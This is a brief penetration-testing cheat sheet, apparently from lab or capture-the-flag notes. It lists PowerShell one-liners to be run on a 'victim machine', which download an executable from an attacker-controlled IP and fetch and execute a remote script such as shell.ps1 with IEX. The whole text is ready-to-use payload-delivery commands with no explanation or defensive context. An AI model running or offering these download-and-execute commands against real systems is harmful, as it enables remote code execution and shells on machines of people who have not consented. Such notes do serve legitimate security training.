### Powershell
On victim machine:
```powershell
Powershell.exe invoke-webrequest -Uri http://10.10.14.28/bfill.exe -OutFile bfill.exe
```

**Download and execute ps1**

```powershell
powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.19/shell.ps1') 
# or 
powershell.exe -a "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.14/shell.ps1')"

# or (Download and execute)
IEX(New-Object Net.WebClient).downloadString('http://attackerip:8000/date.txt');
```

